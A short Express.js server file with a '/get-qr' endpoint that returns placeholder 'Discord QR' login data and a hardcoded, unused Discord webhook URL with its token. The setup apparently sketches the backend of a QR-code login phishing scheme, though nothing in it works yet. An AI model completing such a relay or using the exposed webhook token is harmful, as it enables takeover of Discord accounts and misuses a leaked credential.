const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Replace this with your actual Discord Webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1541138905091538976/GaO3bJqlxV7vm3eY1sxbA_IQj-0FgXcd1MMZvMPLDr__jKVxioZNgjbk-0oka00dwIFr';

app.get('/get-qr', async (req, res) => {
    try {
        // This is a placeholder for the Discord QR logic
        // In a real scenario, you'd get this from Discord's API
        // For now, we generate a dummy one so the site doesn't crash
        const dummyData = "https://discord.com/login-dummy-data";
        
        // Send the data back to the frontend
        res.json({ qr: dummyData });
    } catch (error) {
        res.status(500).json({ error: 'Failed to generate QR' });
    }
});

// This prevents the "Cannot GET /" error on Railway
app.get('/', (req, res) => {
    res.send('Backend is running!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
